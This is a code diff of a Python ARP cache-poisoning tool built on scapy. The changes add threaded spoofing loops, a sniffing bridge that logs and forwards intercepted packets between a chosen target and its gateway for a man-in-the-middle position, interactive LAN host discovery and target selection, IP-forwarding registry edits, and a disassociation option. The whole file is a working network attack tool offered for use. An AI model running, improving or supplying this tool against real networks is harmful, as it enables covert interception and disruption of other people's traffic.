@@ -5,14 +5,26 @@ import time
 import sys
 import ctypes
 import winreg
-from typing import Iterable
+import threading
+from typing import List, Dict, Optional
 import platform
 
 # Scapy imports
-from scapy.all import Ether, ARP, sendp, conf, Packet
+from scapy.all import (
+    Ether,
+    ARP,
+    sendp,
+    conf,
+    Packet,
+    sniff,
+    IP,
+    TCP,
+    UDP,
+    ICMP,
+)
 
 # keep using your ARPSetupProxy class
-from packets import ARPSetupProxy
+from packets import ARPSetupProxy, discover_hosts, get_default_interface
 
 # ---- Helpers ----
 def is_admin() -> bool:
@@ -23,7 +35,7 @@ def is_admin() -> bool:
 
 def enable_windows_ipv4_forwarding() -> bool:
     """
-    print(r"Try to set the registry key HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter = 1")
+    Try to set the registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\IPEnableRouter = 1
     Returns True if set successfully, False otherwise.
     Note: On many Windows installs a reboot is required for the change to take full effect.
     """
@@ -74,6 +86,9 @@ class Spoofer(object):
                                    gatewayip, targetmac, targetip,
                                    disassociate)
         self.__disassociate = disassociate
+        self.__stop_event = threading.Event()
+        self.__poison_thread = None
+        self.__raw_frame_thread = None
 
     def execute(self):
         # Basic environment checks
@@ -205,13 +220,12 @@ class Spoofer(object):
         except Exception:
             raw_iterable = False
 
-        # If raw frames are provided, use them
+        raw_frames = None
         if raw_iterable:
-            print('[*] Detected raw frames from ARPSetupProxy; sending raw Ethernet frames.')
-            while True:
-                for frame in pk:
-                    self.__send_frame(frame)
-                time.sleep(self.__interval)
+            raw_frames = list(pk)
+            if raw_frames:
+                print('[*] Detected raw frames from ARPSetupProxy; sending raw Ethernet frames.')
+                self.__start_raw_frame_loop(raw_frames)
 
         # Otherwise, attempt to extract fields and build ARP replies
         attacker_mac = getattr(pk, 'attacker_mac', None)
@@ -244,45 +258,187 @@ class Spoofer(object):
                                                                         pdst=gateway_ip)
 
         print('[*] Starting ARP poisoning on interface:', self.__arp.interface)
-        while True:
-            # Send both spoofed replies to keep ARP caches poisoned
-            sendp(arp_to_target, iface=self.__arp.interface, verbose=False)
-            sendp(arp_to_gateway, iface=self.__arp.interface, verbose=False)
+        if raw_frames is None:
+            self.__start_poisoning_loop(arp_to_target, arp_to_gateway, pk)
+        try:
+            self.__bridge_traffic(attacker_mac=attacker_mac,
+                                  gateway_mac=gateway_mac,
+                                  target_mac=target_mac)
+        except KeyboardInterrupt:
+            print('\n[!] ARP Spoofing attack aborted by user.')
+            raise
+        finally:
+            self.__stop_poisoning_loop()
 
-            # If ARPSetupProxy provides extra frames (e.g., disassociate frames), attempt to send them
-            extras = getattr(pk, 'extras', None) or getattr(pk, 'disassociate_frames', None)
-            if self.__disassociate and extras:
-                # support either iterable of bytes or scapy Packets
-                if isinstance(extras, (list, tuple)):
-                    for extra in extras:
-                        self.__send_frame(extra)
-                else:
-                    self.__send_frame(extras)
+    def __start_poisoning_loop(self, arp_to_target, arp_to_gateway, pk):
+        self.__stop_event.clear()
 
-            time.sleep(self.__interval)
+        def _poison_loop():
+            extras_source = getattr(pk, 'extras', None) or getattr(pk, 'disassociate_frames', None)
+            while not self.__stop_event.is_set():
+                sendp(arp_to_target, iface=self.__arp.interface, verbose=False)
+                sendp(arp_to_gateway, iface=self.__arp.interface, verbose=False)
+
+                if self.__disassociate and extras_source:
+                    if isinstance(extras_source, (list, tuple)):
+                        for extra in extras_source:
+                            self.__send_frame(extra)
+                    else:
+                        self.__send_frame(extras_source)
+
+                if self.__stop_event.wait(self.__interval):
+                    break
+
+        self.__poison_thread = threading.Thread(target=_poison_loop, name='ARP-Poisoner', daemon=True)
+        self.__poison_thread.start()
+
+    def __stop_poisoning_loop(self):
+        self.__stop_event.set()
+        if self.__poison_thread is not None:
+            self.__poison_thread.join(timeout=self.__interval * 2)
+            self.__poison_thread = None
+        if self.__raw_frame_thread is not None:
+            self.__raw_frame_thread.join(timeout=self.__interval * 2)
+            self.__raw_frame_thread = None
+
+    def __start_raw_frame_loop(self, frames):
+        def _raw_loop():
+            while not self.__stop_event.is_set():
+                for frame in frames:
+                    self.__send_frame(frame)
+                if self.__stop_event.wait(self.__interval):
+                    break
+
+        self.__raw_frame_thread = threading.Thread(target=_raw_loop, name='ARP-RawFrames', daemon=True)
+        self.__raw_frame_thread.start()
+
+    def __bridge_traffic(self, *, attacker_mac: str, gateway_mac: str, target_mac: str):
+        """
+        Sniff packets from target and gateway, log them, and forward to complete MITM.
+        """
+        iface = self.__arp.interface
+        attacker_mac = attacker_mac.lower()
+        gateway_mac = gateway_mac.lower()
+        target_mac = target_mac.lower()
+
+        filter_expr = (
+            f"(ether src {target_mac} and ether dst {attacker_mac}) or "
+            f"(ether src {gateway_mac} and ether dst {attacker_mac})"
+        )
+
+        print('[*] MITM bridge active. Forwarding traffic between target and gateway.')
+
+        def _classify(pkt):
+            if not pkt.haslayer(Ether):
+                return None
+            ether = pkt[Ether]
+            src_mac = ether.src.lower()
+            dst_mac = ether.dst.lower()
+
+            if src_mac == target_mac and dst_mac == attacker_mac:
+                return 'target -> gateway', gateway_mac
+            if src_mac == gateway_mac and dst_mac == attacker_mac:
+                return 'gateway -> target', target_mac
+            return None
+
+        def _log_and_forward(pkt):
+            try:
+                classification = _classify(pkt)
+                if not classification:
+                    return
+                direction, forward_dst = classification
+
+                print(f"[MITM] {direction}: {pkt.summary()}")
+
+                forward_pkt = pkt.copy()
+                forward_pkt[Ether].src = attacker_mac
+                forward_pkt[Ether].dst = forward_dst
+
+                if forward_pkt.haslayer(IP):
+                    del forward_pkt[IP].chksum
+                    if forward_pkt.haslayer(TCP):
+                        del forward_pkt[TCP].chksum
+                    elif forward_pkt.haslayer(UDP):
+                        del forward_pkt[UDP].chksum
+                    elif forward_pkt.haslayer(ICMP):
+                        del forward_pkt[ICMP].chksum
+
+                sendp(forward_pkt, iface=iface, verbose=False)
+            except Exception as exc:
+                print(f"[!] MITM forwarding error: {exc}")
+
+        def _match(pkt):
+            return _classify(pkt) is not None
+
+        while not self.__stop_event.is_set():
+            sniff(
+                iface=iface,
+                prn=_log_and_forward,
+                store=False,
+                filter=filter_expr,
+                lfilter=_match,
+                timeout=1,
+            )
+
+def _print_discovered_hosts(hosts: List[Dict[str, Optional[str]]]):
+    headers = ['Idx', 'IP Address', 'MAC Address', 'Hostname', 'Sources']
+    rows = []
+    for idx, host in enumerate(hosts, start=1):
+        rows.append([
+            str(idx),
+            host.get('ip', '') or '',
+            host.get('mac', '') or 'unknown',
+            host.get('hostname', '') or 'unknown',
+            host.get('sources', '') or '',
+        ])
+
+    col_widths = [max(len(headers[i]), *(len(row[i]) for row in rows)) for i in range(len(headers))]
+    header_line = '  '.join(headers[i].ljust(col_widths[i]) for i in range(len(headers)))
+    divider = '  '.join('-' * col_widths[i] for i in range(len(headers)))
+
+    print('\n[+] Discovered hosts:')
+    print(header_line)
+    print(divider)
+    for row in rows:
+        print('  '.join(row[i].ljust(col_widths[i]) for i in range(len(headers))))
+
+
+def _choose_host(hosts: List[Dict[str, Optional[str]]]) -> Dict[str, Optional[str]]:
+    while True:
+        choice = input('\n[?] Select target by index (or Q to abort): ').strip().lower()
+        if choice in ('q', 'quit', 'exit'):
+            raise SystemExit('[!] Aborted by user during target selection.')
+        if not choice.isdigit():
+            print('[!] Invalid selection. Please enter a number from the list.')
+            continue
+        index = int(choice)
+        if not 1 <= index <= len(hosts):
+            print('[!] Selection out of range. Try again.')
+            continue
+        return hosts[index - 1]
+
 
 def is_admin():
     if sys.platform == 'win32':
         try:
             return ctypes.windll.shell32.IsUserAnAdmin() != 0
-        except:
+        except Exception:
             return False
     return os.getuid() == 0  # Works on Unix systems like Linux and macOS
 
-if not is_admin():
-    print("You need to run this script with elevated (admin) privileges.")
-else:
-    print("You have the necessary privileges.")
 
-if __name__ == '__main__':
-    is_admin()
+def main():
+    if not is_admin():
+        print("You need to run this script with elevated (admin) privileges.")
+    else:
+        print("You have the necessary privileges.")
 
     parser = argparse.ArgumentParser(
         description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                     'Spoofing") on local networks.')
     options = parser.add_mutually_exclusive_group()
-    parser.add_argument('targetip', type=str, metavar='TARGET_IP',
-                        help='IP address currently assigned to the target.')
+    parser.add_argument('targetip', type=str, nargs='?', metavar='TARGET_IP',
+                        help='IP address currently assigned to the target. Optional when using --scan.')
     parser.add_argument('-i', '--interface', type=str,
                         help='Interface on the attacker machine to send '
                              'packets from.')
@@ -299,6 +455,12 @@ if __name__ == '__main__':
     parser.add_argument('--interval', type=float, default=1, metavar='TIME',
                         help='Time in between each transmission of spoofed ARP '
                              'packets (defaults to 1 second).')
+    parser.add_argument('--scan', action='store_true',
+                        help='Discover hosts on the local network and allow interactive target selection.')
+    parser.add_argument('--scan-cidr', type=str, default=None,
+                        help='Optional CIDR (e.g., 192.168.1.0/24) to scan instead of deriving from interface.')
+    parser.add_argument('--scan-timeout', type=int, default=2,
+                        help='Timeout in seconds for ARP ping responses during scanning (default: 2).')
     options.add_argument('-d', '--disassociate', action='store_true',
                          help='Execute a disassociation attack in which a '
                               'randomized MAC address is set for the attacker '
@@ -312,5 +474,46 @@ if __name__ == '__main__':
                               'man-in-the-middle attack. Requires '
                               'administrator privileges.')
     cli_args = parser.parse_args()
-    spoofer = Spoofer(**vars(cli_args))
+
+    if cli_args.scan:
+        interface = cli_args.interface or get_default_interface()
+        if not interface:
+            raise SystemExit('[!] Unable to determine default interface. Supply one with --interface.')
+        cli_args.interface = interface
+        print(f'[*] Scanning hosts via interface {interface}...')
+        hosts = discover_hosts(interface=interface,
+                               cidr=cli_args.scan_cidr,
+                               timeout=cli_args.scan_timeout)
+        if not hosts:
+            raise SystemExit('[!] No hosts discovered. Try specifying --scan-cidr or increase --scan-timeout.')
+        _print_discovered_hosts(hosts)
+        chosen = _choose_host(hosts)
+        cli_args.targetip = chosen.get('ip')
+        if not cli_args.targetip:
+            raise SystemExit('[!] Selected host has no IP address. Aborting.')
+        if not cli_args.targetmac and chosen.get('mac'):
+            cli_args.targetmac = chosen['mac']
+        hostname = chosen.get('hostname') or 'unknown'
+        print(f"[+] Selected target {cli_args.targetip} ({hostname})")
+
+    if not cli_args.targetip:
+        parser.error('TARGET_IP is required unless --scan is used.')
+
+    spoofer_args = {
+        'interface': cli_args.interface,
+        'attackermac': cli_args.attackermac,
+        'gatewaymac': cli_args.gatewaymac,
+        'gatewayip': cli_args.gatewayip,
+        'targetmac': cli_args.targetmac,
+        'targetip': cli_args.targetip,
+        'interval': cli_args.interval,
+        'disassociate': cli_args.disassociate,
+        'ipforward': cli_args.ipforward,
+    }
+
+    spoofer = Spoofer(**spoofer_args)
     spoofer.execute()
+
+
+if __name__ == '__main__':
+    main()
